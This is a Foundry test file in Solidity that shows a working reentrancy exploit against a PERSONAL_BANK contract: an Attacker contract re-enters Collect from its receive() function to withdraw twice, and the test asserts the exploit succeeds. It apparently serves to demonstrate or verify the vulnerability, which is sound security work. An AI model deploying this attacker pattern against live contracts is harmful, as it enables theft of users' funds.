
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PERSONAL_BANK, LogFile} from "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {

    PERSONAL_BANK public bank;

    Attacker public _attacker;

    function setUp() public {
        LogFile log = new LogFile();
        bank = new PERSONAL_BANK();
        bank.SetLogFile(address(log));
        bank.SetMinSum(1);
        bank.Initialized();

        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1);
        vm.assume(attackVal <= type(uint128).max);
        

        vm.deal(address(bank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PERSONAL_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = PERSONAL_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        attackAmount = val;
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        (bool ok, ) = address(victim).call(abi.encodeWithSelector(victim.Collect.selector, val));

        uint256 currentBalance = address(this).balance;
        if (currentBalance == initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            victim.Collect(attackAmount);
            attackCallCount++;
        }
    }
}
